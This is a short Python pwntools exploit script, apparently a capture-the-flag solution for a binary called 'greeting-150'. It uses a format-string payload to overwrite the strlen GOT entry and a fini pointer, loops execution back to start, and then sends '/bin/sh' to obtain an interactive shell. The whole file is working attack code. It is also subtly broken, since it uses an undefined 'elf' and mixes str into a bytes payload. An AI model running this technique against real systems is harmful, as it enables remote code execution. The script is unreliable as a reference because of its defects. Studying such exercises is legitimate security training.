from pwn import *
#io=remote("111.198.29.45",47611)
io=process("./greeting-150")
#elf=ELF("./greeting-150")
strlen_got=elf.got['strlen']
fini_got=0x08049934
start_addr=0x80484f0
print("strlen:"+str(hex(strlen_got)))
print("fini_got:"+str(hex(fini_got)))
payload=b"aa"
payload+=p32(strlen_got+2)
payload+=p32(fini_got+2)
payload+=p32(strlen_got)
payload+=p32(fini_got)
payload+="%2016c%12$hn%13$hn"
payload+="%31884c%14$hn"
payload+="%96c%15$hn"
#gdb.attach(io,'b *0x0804864C')
io.sendline(payload)
io.sendline("/bin/sh")
io.interactive()
